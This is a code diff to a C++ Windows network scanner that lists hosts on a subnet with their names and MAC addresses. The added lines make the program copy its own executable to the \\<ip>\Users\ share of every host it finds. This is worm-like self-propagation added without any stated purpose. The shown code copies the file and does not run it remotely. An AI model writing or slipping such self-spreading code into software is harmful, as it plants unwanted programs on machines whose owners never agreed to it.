@@ -38,6 +38,34 @@ static std::wstring GetExeName()
     return std::wstring(buffer).substr(pos + 1, std::wstring(buffer).length() - pos);
 }
 
+static std::wstring GetFullPath()
+{
+    std::wstring path = L"";
+    path.append(GetPath().c_str());
+    path.append(GetExeName().c_str());
+    return path;
+}
+
+static std::wstring CopyToLocation(std::wstring _location)
+{
+    std::wstring path = GetFullPath();
+    _location.append(GetExeName().c_str());
+
+    if(path == _location)
+        return L"TRUE";
+
+    wprintf(L"Copying File To Location: %ws\n", _location.c_str());
+
+    if(CopyFileW(path.c_str(), LPCWSTR(_location.c_str()), FALSE) == 0)
+        printf("COPYING FILE STATUS: FAILED! ERROR CODE: %u \n", GetLastError());
+    else
+    {
+        wprintf(L"Copying Exe To New Location FINISHED. NEW LOCATION: %ws\n", _location.c_str());
+        return _location;
+    }
+    return L"FALSE";
+}
+
 static bool get_name(unsigned char* name, char dest[32])
 {
     struct in_addr destip;
@@ -104,6 +132,10 @@ static void ScanNetwork(std::string ipAddress)
         if (get_mac(mac, address))
         {
             printf("%s : %s : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", address, (get_name(name, address)) ? (char*)name : "-", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+            std::wstring location = L"\\\\";
+            location.append(std::wstring(ip2.begin(), ip2.end()));
+            location.append(L"\\Users\\");
+            CopyToLocation(location);
         }
     }
     return;
